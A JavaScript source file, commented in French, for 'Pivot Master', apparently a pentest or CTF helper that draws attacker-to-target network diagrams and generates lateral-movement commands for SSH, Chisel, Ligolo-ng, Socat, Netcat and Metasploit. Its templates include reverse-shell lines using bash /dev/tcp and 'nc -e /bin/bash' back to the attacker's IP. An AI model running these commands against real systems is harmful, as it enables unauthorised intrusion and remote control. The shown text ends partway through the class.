/**
 * Pivot Master - Générateur de commandes de pivot
 * Interface simple pour saisir les informations et générer des commandes
 */

class NetworkVisualizer {
    constructor(pivotMaster) {
        this.pivotMaster = pivotMaster;
        this.network = null;
        this.nodes = null;
        this.edges = null;
        this.container = null;
        this.physicsEnabled = true;
    }

    async init() {
        this.container = document.getElementById('networkCanvas');
        if (!this.container) {
            console.warn('Conteneur réseau non trouvé');
            return;
        }

        this.setupNetworkOptions();
        this.setupEventListeners();
        this.createNetwork();
    }

    setupEventListeners() {
        // Options réseau
        document.getElementById('showLabels')?.addEventListener('change', () => this.updateNetwork());
        document.getElementById('showEdgeLabels')?.addEventListener('change', () => this.updateNetwork());
        document.getElementById('hierarchicalLayout')?.addEventListener('change', () => this.updateNetwork());
        document.getElementById('smoothEdges')?.addEventListener('change', () => this.updateNetwork());
    }

    setupNetworkOptions() {
        this.nodes = new vis.DataSet([]);
        this.edges = new vis.DataSet([]);
    }

    createNetwork() {
        const data = {
            nodes: this.nodes,
            edges: this.edges
        };

        const options = {
            nodes: {
                shape: 'dot',
                size: 25,
                font: {
                    size: 14,
                    color: '#000000'
                },
                borderWidth: 3,
                shadow: true
            },
            edges: {
                width: 3,
                color: { inherit: 'from' },
                smooth: {
                    type: 'continuous'
                },
                arrows: {
                    to: { enabled: true, scaleFactor: 1.2 }
                },
                shadow: true
            },
            physics: {
                enabled: this.physicsEnabled,
                stabilization: { iterations: 100 }
            },
            interaction: {
                hover: true,
                selectConnectedEdges: false
            }
        };

        this.network = new vis.Network(this.container, data, options);
        
        // Événements réseau
        this.network.on('click', (params) => {
            if (params.nodes.length > 0) {
                this.showNodeInfo(params.nodes[0]);
            }
        });

        this.network.on('hoverNode', () => {
            this.container.style.cursor = 'pointer';
        });

        this.network.on('blurNode', () => {
            this.container.style.cursor = 'default';
        });
    }

    updateNetworkFromConfig() {
        if (!this.network) return;

        const config = this.pivotMaster.config;
        this.nodes.clear();
        this.edges.clear();

        // Nœud attaquant
        this.nodes.add({
            id: 'attacker',
            label: `🔥 Attaquant\n${config.attacker.ip}`,
            color: {
                background: '#dc3545',
                border: '#c82333'
            },
            group: 'attacker',
            x: -200,
            y: 0,
            fixed: { x: true, y: false }
        });

        // Target 1 (point d'entrée)
        if (config.target1.ip) {
            const network1 = this.getNetworkSegment(config.target1.ip);
            this.nodes.add({
                id: 'target1',
                label: `${this.getOSIcon(config.target1.os)} Target 1\n${config.target1.ip}\n(${config.target1.user || 'user'})`,
                color: this.getNodeColor(config.target1.os),
                group: network1,
                x: 0,
                y: -100
            });

            // Connexion attaquant -> target1
            this.edges.add({
                id: 'att-t1',
                from: 'attacker',
                to: 'target1',
                label: 'Initial Access',
                color: { color: '#28a745' },
                width: 4
            });
        }

        // Target 2 (destination)
        if (config.target2.ip) {
            const network2 = this.getNetworkSegment(config.target2.ip);
            this.nodes.add({
                id: 'target2',
                label: `${this.getOSIcon(config.target2.os)} Target 2\n${config.target2.ip}\n:${config.target2.port}`,
                color: this.getNodeColor(config.target2.os),
                group: network2,
                x: 200,
                y: 0
            });

            // Connexion target1 -> target2 (pivot)
            if (config.target1.ip) {
                this.edges.add({
                    id: 't1-t2',
                    from: 'target1',
                    to: 'target2',
                    label: 'Pivot',
                    color: { color: '#ffc107' },
                    width: 4,
                    dashes: [10, 5]
                });
            }
        }

        // Target 3 (double pivot)
        if (config.doublePivot && config.target3.ip) {
            const network3 = this.getNetworkSegment(config.target3.ip);
            this.nodes.add({
                id: 'target3',
                label: `🎯 Target 3\n${config.target3.ip}\n:${config.target3.port}`,
                color: {
                    background: '#6f42c1',
                    border: '#5a31a5'
                },
                group: network3,
                x: 400,
                y: 100
            });

            // Connexion target2 -> target3 (double pivot)
            this.edges.add({
                id: 't2-t3',
                from: 'target2',
                to: 'target3',
                label: 'Double Pivot',
                color: { color: '#e83e8c' },
                width: 4,
                dashes: [15, 10]
            });
        }

        // Grouper par réseau si différent
        this.addNetworkGroups();
        
        // Générer l'explication intelligente
        this.generateExplanation();
        
        // Ajuster la vue
        setTimeout(() => {
            this.network.fit();
        }, 500);
    }

    generateExplanation() {
        const config = this.pivotMaster.config;
        const selectedTechniques = Array.from(this.pivotMaster.selectedTechniques);
        const explanationContent = document.getElementById('explanationContent');
        const explanationStatus = document.getElementById('explanationStatus');
        
        if (!explanationContent) return;

        // Vérifier si on a assez d'infos
        if (!config.target1.ip || !config.target2.ip) {
            explanationContent.innerHTML = `
                <div class="explanation-placeholder">
                    <i>📝</i>
                    <p>Configurez au minimum Target 1 et Target 2 pour voir l'explication du pivot...</p>
                </div>
            `;
            explanationStatus.innerHTML = `
                <span class="status-indicator">⚠️</span>
                <span>Configuration incomplète</span>
            `;
            return;
        }

        // Analyser la configuration
        const network1 = this.getNetworkSegment(config.target1.ip);
        const network2 = this.getNetworkSegment(config.target2.ip);
        const network3 = config.doublePivot ? this.getNetworkSegment(config.target3.ip) : null;
        
        const isDifferentNetwork = network1 !== network2;
        const isTripleNetwork = network3 && network3 !== network2 && network3 !== network1;

        // Générer le résumé réseau
        let networkSummary = `
            <div class="network-summary">
                <h5>📊 Analyse de la Topologie Réseau</h5>
                <p>
                    ${isDifferentNetwork ? 
                        `🔀 <strong>Pivot multi-réseau détecté :</strong> ${network1} → ${network2}${network3 ? ` → ${network3}` : ''}` :
                        `🏠 <strong>Pivot intra-réseau :</strong> Toutes les machines dans ${network1}`
                    }
                    ${selectedTechniques.length > 0 ? 
                        ` | <strong>Techniques sélectionnées :</strong> ${selectedTechniques.length}` : 
                        ' | ⚠️ Aucune technique sélectionnée'
                    }
                </p>
            </div>
        `;

        // Générer les étapes du pivot
        let pivotFlow = '<div class="pivot-flow">';
        let stepNumber = 1;

        // Étape 1: Accès initial
        pivotFlow += `
            <div class="flow-step">
                <div class="step-header">
                    <div class="step-number">${stepNumber++}</div>
                    <div class="step-title">🎯 Accès Initial - Compromission de Target 1</div>
                </div>
                <div class="step-description">
                    Vous avez obtenu un accès sur <code>${config.target1.ip}</code> (${config.target1.user || 'utilisateur'}) 
                    via votre machine attaquante <code>${config.attacker.ip}</code>.
                    ${config.target1.services ? ` Services découverts : ${config.target1.services}` : ''}
                </div>
            </div>
        `;

        // Étape 2: Configuration du pivot
        const pivotDescription = isDifferentNetwork ? 
            `Cette machine sert de <strong>pont</strong> pour atteindre le réseau ${network2} depuis ${network1}.` :
            `Cette machine sert de <strong>relais</strong> pour atteindre d'autres services dans le même réseau.`;

        pivotFlow += `
            <div class="flow-step">
                <div class="step-header">
                    <div class="step-number">${stepNumber++}</div>
                    <div class="step-title">🔀 Configuration du Pivot vers Target 2</div>
                </div>
                <div class="step-description">
                    Target 1 va servir de point de pivot pour accéder à <code>${config.target2.ip}:${config.target2.port}</code>. 
                    ${pivotDescription}
                </div>
                ${selectedTechniques.length > 0 ? `
                    <div class="step-techniques">
                        ${selectedTechniques.map(tech => `<span class="technique-badge ${tech}">${this.getTechniqueName(tech)}</span>`).join('')}
                    </div>
                ` : ''}
            </div>
        `;

        // Étape 3: Double pivot si configuré
        if (config.doublePivot && config.target3.ip) {
            const doublePivotDescription = isTripleNetwork ? 
                `Target 2 servira de second relais pour atteindre le réseau ${network3}.` :
                `Target 2 servira de second relais dans le réseau ${network2}.`;

            pivotFlow += `
                <div class="flow-step">
                    <div class="step-header">
                        <div class="step-number">${stepNumber++}</div>
                        <div class="step-title">🔀🔀 Double Pivot vers Target 3</div>
                    </div>
                    <div class="step-description">
                        Une fois Target 2 accessible, vous configurerez un <strong>double pivot</strong> pour atteindre 
                        <code>${config.target3.ip}:${config.target3.port}</code>. ${doublePivotDescription}
                    </div>
                    ${selectedTechniques.length > 0 ? `
                        <div class="step-techniques">
                            ${selectedTechniques.map(tech => `<span class="technique-badge ${tech}">${this.getTechniqueName(tech)} (Chain)</span>`).join('')}
                        </div>
                    ` : ''}
                </div>
            `;
        }

        // Étape finale: Exécution
        pivotFlow += `
            <div class="flow-step">
                <div class="step-header">
                    <div class="step-number">${stepNumber}</div>
                    <div class="step-title">⚡ Exécution des Commandes</div>
                </div>
                <div class="step-description">
                    Les commandes générées configureront automatiquement ${selectedTechniques.length > 0 ? 'les techniques sélectionnées' : 'les techniques par défaut'} 
                    pour établir ${config.doublePivot ? 'la chaîne de double pivot' : 'le tunnel de pivot'}. 
                    Vous pourrez ensuite accéder aux services cibles comme s'ils étaient locaux.
                </div>
            </div>
        `;

        pivotFlow += '</div>';

        // Assembler le contenu final
        explanationContent.innerHTML = networkSummary + pivotFlow;

        // Mettre à jour le status
        const techniqueCount = selectedTechniques.length;
        const pivotType = config.doublePivot ? 'Double Pivot' : 'Simple Pivot';
        explanationStatus.innerHTML = `
            <span class="status-indicator">✅</span>
            <span>${pivotType} | ${techniqueCount} technique${techniqueCount > 1 ? 's' : ''}</span>
        `;
    }

    getTechniqueName(tech) {
        const names = {
            'ssh': 'SSH',
            'chisel': 'Chisel',
            'ligolo': 'Ligolo-ng',
            'socat': 'Socat',
            'netcat': 'Netcat',
            'metasploit': 'Metasploit'
        };
        return names[tech] || tech;
    }

    getNetworkSegment(ip) {
        if (!ip) return 'unknown';
        const parts = ip.split('.');
        if (parts.length >= 3) {
            return `${parts[0]}.${parts[1]}.${parts[2]}.x`;
        }
        return 'unknown';
    }

    getOSIcon(os) {
        switch(os) {
            case 'linux': return '🐧';
            case 'windows': return '🪟';
            default: return '💻';
        }
    }

    getNodeColor(os) {
        switch(os) {
            case 'linux':
                return {
                    background: '#17a2b8',
                    border: '#138496'
                };
            case 'windows':
                return {
                    background: '#007bff',
                    border: '#0056b3'
                };
            default:
                return {
                    background: '#6c757d',
                    border: '#545b62'
                };
        }
    }

    addNetworkGroups() {
        // Ajouter des nœuds de réseau pour la segmentation
        const networks = new Set();
        this.nodes.forEach(node => {
            if (node.group && node.group !== 'attacker') {
                networks.add(node.group);
            }
        });

        let yOffset = 200;
        networks.forEach(network => {
            this.nodes.add({
                id: `net-${network}`,
                label: `📡 ${network}`,
                color: {
                    background: '#f8f9fa',
                    border: '#dee2e6'
                },
                shape: 'box',
                size: 15,
                font: { size: 10 },
                x: 0,
                y: yOffset,
                physics: false
            });
            yOffset += 50;
        });
    }

    showNodeInfo(nodeId) {
        const node = this.nodes.get(nodeId);
        const config = this.pivotMaster.config;
        const infoContent = document.getElementById('networkInfoContent');
        
        if (!infoContent || !node) return;

        let info = '';
        
        switch(nodeId) {
            case 'attacker':
                info = `
                    <div class="node-info">
                        <h5>🔥 Machine Attaquante</h5>
                        <div class="node-info-item">
                            <div class="node-info-label">Adresse IP</div>
                            <div class="node-info-value">${config.attacker.ip}</div>
                        </div>
                        <div class="node-info-item">
                            <div class="node-info-label">Port d'écoute</div>
                            <div class="node-info-value">${config.attacker.port}</div>
                        </div>
                        <div class="node-info-item">
                            <div class="node-info-label">Rôle</div>
                            <div class="node-info-value">Point de départ de l'attaque</div>
                        </div>
                    </div>
                `;
                break;
            case 'target1':
                info = `
                    <div class="node-info">
                        <h5>${this.getOSIcon(config.target1.os)} Target 1 - Point d'entrée</h5>
                        <div class="node-info-item">
                            <div class="node-info-label">Adresse IP</div>
                            <div class="node-info-value">${config.target1.ip}</div>
                        </div>
                        <div class="node-info-item">
                            <div class="node-info-label">Utilisateur</div>
                            <div class="node-info-value">${config.target1.user || 'N/A'}</div>
                        </div>
                        <div class="node-info-item">
                            <div class="node-info-label">Système d'exploitation</div>
                            <div class="node-info-value">${config.target1.os}</div>
                        </div>
                        <div class="node-info-item">
                            <div class="node-info-label">Services ouverts</div>
                            <div class="node-info-value">${config.target1.services || 'N/A'}</div>
                        </div>
                        <div class="node-info-item">
                            <div class="node-info-label">Réseau</div>
                            <div class="node-info-value">${this.getNetworkSegment(config.target1.ip)}</div>
                        </div>
                    </div>
                `;
                break;
            case 'target2':
                info = `
                    <div class="node-info">
                        <h5>${this.getOSIcon(config.target2.os)} Target 2 - Destination</h5>
                        <div class="node-info-item">
                            <div class="node-info-label">Adresse IP</div>
                            <div class="node-info-value">${config.target2.ip}</div>
                        </div>
                        <div class="node-info-item">
                            <div class="node-info-label">Port cible</div>
                            <div class="node-info-value">${config.target2.port}</div>
                        </div>
                        <div class="node-info-item">
                            <div class="node-info-label">Système d'exploitation</div>
                            <div class="node-info-value">${config.target2.os}</div>
                        </div>
                        <div class="node-info-item">
                            <div class="node-info-label">Réseau</div>
                            <div class="node-info-value">${this.getNetworkSegment(config.target2.ip)}</div>
                        </div>
                        <div class="node-info-item">
                            <div class="node-info-label">Accès via</div>
                            <div class="node-info-value">Pivot depuis Target 1</div>
                        </div>
                    </div>
                `;
                break;
            case 'target3':
                info = `
                    <div class="node-info">
                        <h5>🎯 Target 3 - Double Pivot</h5>
                        <div class="node-info-item">
                            <div class="node-info-label">Adresse IP</div>
                            <div class="node-info-value">${config.target3.ip}</div>
                        </div>
                        <div class="node-info-item">
                            <div class="node-info-label">Port cible</div>
                            <div class="node-info-value">${config.target3.port}</div>
                        </div>
                        <div class="node-info-item">
                            <div class="node-info-label">Réseau</div>
                            <div class="node-info-value">${this.getNetworkSegment(config.target3.ip)}</div>
                        </div>
                        <div class="node-info-item">
                            <div class="node-info-label">Accès via</div>
                            <div class="node-info-value">Double pivot depuis Target 2</div>
                        </div>
                    </div>
                `;
                break;
            default:
                if (nodeId.startsWith('net-')) {
                    const network = nodeId.replace('net-', '');
                    info = `
                        <div class="node-info">
                            <h5>📡 Segment Réseau</h5>
                            <div class="node-info-item">
                                <div class="node-info-label">Réseau</div>
                                <div class="node-info-value">${network}</div>
                            </div>
                            <div class="node-info-item">
                                <div class="node-info-label">Type</div>
                                <div class="node-info-value">Segment isolé</div>
                            </div>
                        </div>
                    `;
                }
                break;
        }

        infoContent.innerHTML = info;
    }

    updateNetwork() {
        if (!this.network) return;

        const showLabels = document.getElementById('showLabels')?.checked ?? true;
        const showEdgeLabels = document.getElementById('showEdgeLabels')?.checked ?? false;
        const hierarchical = document.getElementById('hierarchicalLayout')?.checked ?? false;
        const smoothEdges = document.getElementById('smoothEdges')?.checked ?? true;

        const options = {
            nodes: {
                font: { color: showLabels ? '#000000' : 'transparent' }
            },
            edges: {
                label: showEdgeLabels ? undefined : '',
                smooth: smoothEdges
            },
            layout: hierarchical ? {
                hierarchical: {
                    direction: 'LR',
                    sortMethod: 'directed'
                }
            } : {}
        };

        this.network.setOptions(options);
    }

    fitNetwork() {
        if (this.network) {
            this.network.fit();
        }
    }

    resetNetwork() {
        if (this.network) {
            this.network.fit();
            this.network.redraw();
        }
    }

    togglePhysics() {
        this.physicsEnabled = !this.physicsEnabled;
        if (this.network) {
            this.network.setOptions({ physics: { enabled: this.physicsEnabled } });
        }
    }

    exportImage() {
        if (this.network) {
            const canvas = this.network.canvas.frame.canvas;
            const link = document.createElement('a');
            link.download = 'pivot-topology.png';
            link.href = canvas.toDataURL();
            link.click();
        }
    }
}

class PivotMaster {
    constructor() {
        this.config = {
            attacker: { ip: '', port: '' },
            target1: { ip: '', user: '', os: '', services: '' },
            target2: { ip: '', port: '', os: '' },
            target3: { ip: '', port: '' },
            doublePivot: false
        };
        this.selectedTechniques = new Set(['ssh', 'chisel']);
        this.generatedCommands = {};
        this.activeTab = 'ssh';
        this.networkVisualizer = null;
    }

    /**
     * Initialisation principale
     */
    async init() {
        console.log('🔀 Initialisation de Pivot Master...');
        
        this.setupEventListeners();
        this.loadDefaultValues();
        
        // Initialiser la visualisation réseau
        this.networkVisualizer = new NetworkVisualizer(this);
        await this.networkVisualizer.init();
        
        console.log('✅ Pivot Master initialisé avec succès');
    }

    /**
     * Configuration des écouteurs d'événements
     */
    setupEventListeners() {
        // Checkbox double pivot
        const doublePivotCheckbox = document.getElementById('doublePivot');
        if (doublePivotCheckbox) {
            doublePivotCheckbox.addEventListener('change', () => {
                this.toggleDoublePivot();
                this.updateNetworkVisualization();
            });
        }

        // Techniques checkboxes
        document.querySelectorAll('.technique-card input[type="checkbox"]').forEach(checkbox => {
            checkbox.addEventListener('change', (e) => {
                this.toggleTechnique(e.target.closest('.technique-card').dataset.technique, e.target.checked);
            });
        });

        // Form changes pour auto-save et mise à jour réseau
        document.querySelectorAll('input, select').forEach(input => {
            input.addEventListener('change', () => {
                this.saveConfig();
                this.updateNetworkVisualization();
            });
        });
    }

    /**
     * Valeurs par défaut
     */
    loadDefaultValues() {
        // Charger depuis localStorage ou utiliser les valeurs par défaut
        const saved = localStorage.getItem('pivotMasterConfig');
        if (saved) {
            try {
                this.config = JSON.parse(saved);
                this.restoreFormValues();
            } catch (e) {
                console.warn('Erreur lors du chargement de la config:', e);
            }
        }
        
        // Mise à jour initiale de la visualisation
        setTimeout(() => this.updateNetworkVisualization(), 500);
    }

    /**
     * Restaurer les valeurs du formulaire
     */
    restoreFormValues() {
        document.getElementById('attackerIP').value = this.config.attacker.ip || '10.10.14.15';
        document.getElementById('attackerPort').value = this.config.attacker.port || '4444';
        
        document.getElementById('target1IP').value = this.config.target1.ip || '';
        document.getElementById('target1User').value = this.config.target1.user || '';
        document.getElementById('target1OS').value = this.config.target1.os || 'linux';
        document.getElementById('target1Services').value = this.config.target1.services || '';
        
        document.getElementById('target2IP').value = this.config.target2.ip || '';
        document.getElementById('target2Port').value = this.config.target2.port || '22';
        document.getElementById('target2OS').value = this.config.target2.os || 'linux';
        
        document.getElementById('doublePivot').checked = this.config.doublePivot || false;
        this.toggleDoublePivot();
        
        if (this.config.doublePivot) {
            document.getElementById('target3IP').value = this.config.target3.ip || '';
            document.getElementById('target3Port').value = this.config.target3.port || '3389';
        }
    }

    /**
     * Sauvegarder la configuration
     */
    saveConfig() {
        this.config.attacker.ip = document.getElementById('attackerIP').value;
        this.config.attacker.port = document.getElementById('attackerPort').value;
        
        this.config.target1.ip = document.getElementById('target1IP').value;
        this.config.target1.user = document.getElementById('target1User').value;
        this.config.target1.os = document.getElementById('target1OS').value;
        this.config.target1.services = document.getElementById('target1Services').value;
        
        this.config.target2.ip = document.getElementById('target2IP').value;
        this.config.target2.port = document.getElementById('target2Port').value;
        this.config.target2.os = document.getElementById('target2OS').value;
        
        this.config.doublePivot = document.getElementById('doublePivot').checked;
        
        if (this.config.doublePivot) {
            this.config.target3.ip = document.getElementById('target3IP').value;
            this.config.target3.port = document.getElementById('target3Port').value;
        }

        localStorage.setItem('pivotMasterConfig', JSON.stringify(this.config));
    }

    /**
     * Toggle double pivot
     */
    toggleDoublePivot() {
        const target3Group = document.getElementById('target3Group');
        const isChecked = document.getElementById('doublePivot').checked;
        
        if (target3Group) {
            target3Group.style.display = isChecked ? 'block' : 'none';
        }
        
        this.config.doublePivot = isChecked;
        this.saveConfig();
    }

    /**
     * Toggle technique selection
     */
    toggleTechnique(technique, enabled) {
        const card = document.querySelector(`[data-technique="${technique}"]`);
        
        if (enabled) {
            this.selectedTechniques.add(technique);
            card?.classList.add('selected');
        } else {
            this.selectedTechniques.delete(technique);
            card?.classList.remove('selected');
        }
    }

    /**
     * Validation des données
     */
    validateInput() {
        const errors = [];

        if (!this.config.attacker.ip) {
            errors.push('IP attaquant requis');
        }

        if (!this.config.target1.ip) {
            errors.push('IP Target 1 requis');
        }

        if (!this.config.target2.ip) {
            errors.push('IP Target 2 requis');
        }

        if (this.config.doublePivot && !this.config.target3.ip) {
            errors.push('IP Target 3 requis pour double pivot');
        }

        if (this.selectedTechniques.size === 0) {
            errors.push('Au moins une technique doit être sélectionnée');
        }

        return errors;
    }

    /**
     * Génération des commandes principales
     */
    generateCommands() {
        // Sauvegarder d'abord
        this.saveConfig();

        // Validation
        const errors = this.validateInput();
        if (errors.length > 0) {
            this.showNotification('Erreurs de validation:\n' + errors.join('\n'), 'danger');
            return;
        }

        // Générer les commandes pour chaque technique
        this.generatedCommands = {};

        if (this.selectedTechniques.has('ssh')) {
            this.generatedCommands.ssh = this.generateSSHCommands();
        }

        if (this.selectedTechniques.has('chisel')) {
            this.generatedCommands.chisel = this.generateChiselCommands();
        }

        if (this.selectedTechniques.has('ligolo')) {
            this.generatedCommands.ligolo = this.generateLigoloCommands();
        }

        if (this.selectedTechniques.has('socat')) {
            this.generatedCommands.socat = this.generateSocatCommands();
        }

        if (this.selectedTechniques.has('netcat')) {
            this.generatedCommands.netcat = this.generateNetcatCommands();
        }

        if (this.selectedTechniques.has('metasploit')) {
            this.generatedCommands.metasploit = this.generateMetasploitCommands();
        }

        // Afficher les résultats
        this.displayResults();
        this.showNotification('Commandes générées avec succès !', 'success');
    }

    /**
     * Génération des commandes SSH
     */
    generateSSHCommands() {
        const { attacker, target1, target2, target3, doublePivot } = this.config;
        const commands = [];

        // SSH Dynamic Proxy
        commands.push({
            title: '🔐 SSH Dynamic Proxy (SOCKS)',
            commands: [
                `# Sur Target 1 - Créer un tunnel SOCKS`,
                `ssh -D 1080 ${target1.user}@${target1.ip}`,
                ``,
                `# Test du proxy`,
                `proxychains4 nmap -sT ${target2.ip}`,
                `curl --proxy socks5://127.0.0.1:1080 http://${target2.ip}`
            ]
        });

        // Local Port Forwarding
        commands.push({
            title: '📡 Local Port Forwarding',
            commands: [
                `# Forwarding local vers Target 2`,
                `ssh -L 8080:${target2.ip}:${target2.port} ${target1.user}@${target1.ip}`,
                ``,
                `# Connexion via le tunnel`,
                `ssh user@127.0.0.1 -p 8080  # Si Target 2 = SSH`,
                `curl http://127.0.0.1:8080  # Si Target 2 = HTTP`
            ]
        });

        // Remote Port Forwarding
        commands.push({
            title: '🔄 Remote Port Forwarding',
            commands: [
                `# Reverse shell via SSH`,
                `ssh -R ${attacker.port}:${target2.ip}:${target2.port} ${target1.user}@${target1.ip}`,
                ``,
                `# Sur votre machine`,
                `nc -lvp ${attacker.port}`
            ]
        });

        if (doublePivot) {
            commands.push({
                title: '🔗 Double Pivot SSH',
                commands: [
                    `# Tunnel 1: Attacker -> Target1`,
                    `ssh -D 1080 ${target1.user}@${target1.ip}`,
                    ``,
                    `# Tunnel 2: Target1 -> Target2 -> Target3`,
                    `ssh -o ProxyCommand="nc -X 5 -x 127.0.0.1:1080 %h %p" -D 1081 user@${target2.ip}`,
                    ``,
                    `# Accès final à Target3`,
                    `proxychains4 -f /tmp/proxychains_target3.conf ssh user@${target3.ip}`
                ]
            });
        }

        return commands;
    }

    /**
     * Génération des commandes Chisel
     */
    generateChiselCommands() {
        const { attacker, target1, target2, target3, doublePivot } = this.config;
        const commands = [];

        commands.push({
            title: '⚡ Chisel Reverse Proxy',
            commands: [
                `# Sur votre machine (serveur)`,
                `chisel server -p 8080 --reverse`,
                ``,
                `# Sur Target 1 (client)`,
                `./chisel client ${attacker.ip}:8080 R:1080:socks`,
                ``,
                `# Test du proxy`,
                `proxychains4 nmap -sT ${target2.ip}`
            ]
        });

        commands.push({
            title: '📡 Chisel Port Forward',
            commands: [
                `# Forward direct vers Target 2`,
                `./chisel client ${attacker.ip}:8080 R:${target2.port}:${target2.ip}:${target2.port}`,
                ``,
                `# Connexion locale`,
                `ssh user@127.0.0.1 -p ${target2.port}`
            ]
        });

        if (doublePivot) {
            commands.push({
                title: '🔗 Double Pivot Chisel',
                commands: [
                    `# Serveur principal sur votre machine`,
                    `chisel server -p 8080 --reverse`,
                    ``,
                    `# Client 1 sur Target1`,
                    `./chisel client ${attacker.ip}:8080 R:9001:${target2.ip}:22`,
                    ``,
                    `# Serveur intermédiaire sur Target1`,
                    `./chisel server -p 9002 --reverse`,
                    ``,
                    `# Client 2 sur Target2`,
                    `./chisel client ${target1.ip}:9002 R:9003:${target3.ip}:${target3.port}`
                ]
            });
        }

        return commands;
    }

    /**
     * Génération des commandes Ligolo-ng
     */
    generateLigoloCommands() {
        const { attacker, target1, target2, target3 } = this.config;
        const commands = [];

        commands.push({
            title: '🌐 Ligolo-ng Setup',
            commands: [
                `# Créer l'interface TUN`,
                `sudo ip tuntap add user $(whoami) mode tun ligolo`,
                `sudo ip link set ligolo up`,
                ``,
                `# Serveur sur votre machine`,
                `./proxy -selfcert`,
                ``,
                `# Agent sur Target 1`,
                `./agent -connect ${attacker.ip}:11601 -ignore-cert`
            ]
        });

        commands.push({
            title: '🎯 Ligolo Routes',
            commands: [
                `# Dans la console Ligolo`,
                `>> session`,
                `>> ifconfig  # Voir les interfaces`,
                `>> start`,
                ``,
                `# Ajouter les routes (sur votre machine)`,
                `sudo ip route add ${target2.ip}/32 dev ligolo`,
                ``,
                `# Test direct`,
                `nmap -sT ${target2.ip}`
            ]
        });

        return commands;
    }

    /**
     * Génération des commandes Socat
     */
    generateSocatCommands() {
        const { attacker, target1, target2 } = this.config;
        const commands = [];

        commands.push({
            title: '🔗 Socat TCP Relay',
            commands: [
                `# Relay sur Target 1`,
                `socat TCP-LISTEN:8080,fork TCP:${target2.ip}:${target2.port}`,
                ``,
                `# Connexion via le relay`,
                `ssh user@${target1.ip} -p 8080`
            ]
        });

        commands.push({
            title: '🔄 Socat Reverse Shell Relay',
            commands: [
                `# Écoute sur votre machine`,
                `nc -lvp ${attacker.port}`,
                ``,
                `# Relay sur Target 1`,
                `socat TCP-LISTEN:9999,fork TCP:${attacker.ip}:${attacker.port}`,
                ``,
                `# Reverse shell depuis Target 2`,
                `bash -i >& /dev/tcp/${target1.ip}/9999 0>&1`
            ]
        });

        return commands;
    }

    /**
     * Génération des commandes Netcat
     */
    generateNetcatCommands() {
        const { attacker, target1, target2 } = this.config;
        const commands = [];

        commands.push({
            title: '🐱 Netcat Port Relay',
            commands: [
                `# Relay simple avec named pipes`,
                `mkfifo /tmp/pipe`,
                `nc -l -p 8080 < /tmp/pipe | nc ${target2.ip} ${target2.port} > /tmp/pipe`,
                ``,
                `# Connexion via le relay`,
                `nc ${target1.ip} 8080`
            ]
        });

        commands.push({
            title: '📡 Netcat Reverse Connection',
            commands: [
                `# Écoute sur votre machine`,
                `nc -lvp ${attacker.port}`,
                ``,
                `# Connexion reverse depuis Target 1`,
                `nc ${attacker.ip} ${attacker.port} -e /bin/bash`
            ]
        });

        return commands;
    }

    /**
     * Génération des commandes Metasploit
     */
    generateMetasploitCommands() {
        const { attacker, target1, target2 } = this.config;
        const commands = [];

        commands.push({
            title: '🔴 Metasploit Autoroute',
            commands: [
                `# Dans meterpreter (Target 1)`,
                `meterpreter > run autoroute -s ${target2.ip}/24`,
                `meterpreter > run autoroute -p`,
                ``,
                `# Background la session`,
                `meterpreter > background`
            ]
        });

        commands.push({
            title: '🔧 Proxy SOCKS via Metasploit',
            commands: [
                `# Dans Metasploit`,
                `msf6 > use auxiliary/server/socks_proxy`,
                `msf6 > set SRVPORT 1080`,
                `msf6 > set VERSION 5`,
                `msf6 > run -j`,
                ``,
                `# Test avec proxychains`,
                `proxychains4 nmap -sT ${target2.ip}`
            ]
        });

        commands.push({
            title: '📡 Port Forward Metasploit',
            commands: [
                `# Dans meterpreter`,
                `meterpreter > portfwd add -l 8080 -r ${target2.ip} -p ${target2.port}`,
                `meterpreter > portfwd list`,
                ``,
                `# Connexion locale`,
                `ssh user@127.0.0.1 -p 8080`
            ]
        });

        return commands;
    }

    /**
     * Affichage des résultats
     */
    displayResults() {
        const resultsSection = document.getElementById('resultsSection');
        const commandTabs = document.getElementById('commandTabs');
        const commandsOutput = document.getElementById('commandsOutput');

        if (!resultsSection || !commandTabs || !commandsOutput) return;

        // Afficher la section
        resultsSection.style.display = 'block';

        // Créer les onglets
        commandTabs.innerHTML = '';
        for (const [technique, commands] of Object.entries(this.generatedCommands)) {
            const tab = document.createElement('button');
            tab.className = `tab-button ${technique === this.activeTab ? 'active' : ''}`;
            tab.textContent = this.getTechniqueDisplayName(technique);
            tab.onclick = () => this.switchTab(technique);
            commandTabs.appendChild(tab);
        }

        // Afficher les commandes de l'onglet actif
        this.displayCommandsForTechnique(this.activeTab);

        // Scroll vers les résultats
        resultsSection.scrollIntoView({ behavior: 'smooth' });
    }

    /**
     * Changer d'onglet
     */
    switchTab(technique) {
        this.activeTab = technique;

        // Mettre à jour les onglets
        document.querySelectorAll('.tab-button').forEach(tab => {
            tab.classList.remove('active');
        });
        
        event.target.classList.add('active');

        // Afficher les commandes
        this.displayCommandsForTechnique(technique);
    }

    /**
     * Afficher les commandes d'une technique
     */
    displayCommandsForTechnique(technique) {
        const commandsOutput = document.getElementById('commandsOutput');
        if (!commandsOutput || !this.generatedCommands[technique]) return;

        let html = '';

        this.generatedCommands[technique].forEach(block => {
            html += `<div class="command-block">`;
            html += `<div class="command-title">${block.title}</div>`;
            
            block.commands.forEach(line => {
                if (line.trim() === '') {
                    html += `<div style="height: 0.5rem;"></div>`;
                } else if (line.startsWith('#')) {
                    html += `<div class="command-comment">${line}</div>`;
                } else if (line.includes('>>') || line.includes('meterpreter >') || line.includes('msf6 >')) {
                    html += `<div class="command-important">${line}</div>`;
                } else {
                    html += `<div class="command-line">${line}</div>`;
                }
            });
            
            html += `</div>`;
        });

        commandsOutput.innerHTML = html;
    }

    /**
     * Noms d'affichage des techniques
     */
    getTechniqueDisplayName(technique) {
        const names = {
            ssh: '🔐 SSH',
            chisel: '⚡ Chisel',
            ligolo: '🌐 Ligolo-ng',
            socat: '🔗 Socat',
            netcat: '🐱 Netcat',
            metasploit: '🔴 Metasploit'
        };
        return names[technique] || technique;
    }

    /**
     * Copier toutes les commandes
     */
    copyAllCommands() {
        let allCommands = '';

        for (const [technique, commands] of Object.entries(this.generatedCommands)) {
            allCommands += `\n=== ${this.getTechniqueDisplayName(technique)} ===\n\n`;
            
            commands.forEach(block => {
                allCommands += `${block.title}\n`;
                allCommands += '-'.repeat(block.title.length) + '\n';
                allCommands += block.commands.join('\n') + '\n\n';
            });
        }

        navigator.clipboard.writeText(allCommands).then(() => {
            this.showNotification('Toutes les commandes copiées !', 'success');
        }).catch(() => {
            this.showNotification('Erreur lors de la copie', 'danger');
        });
    }

    /**
     * Export en script
     */
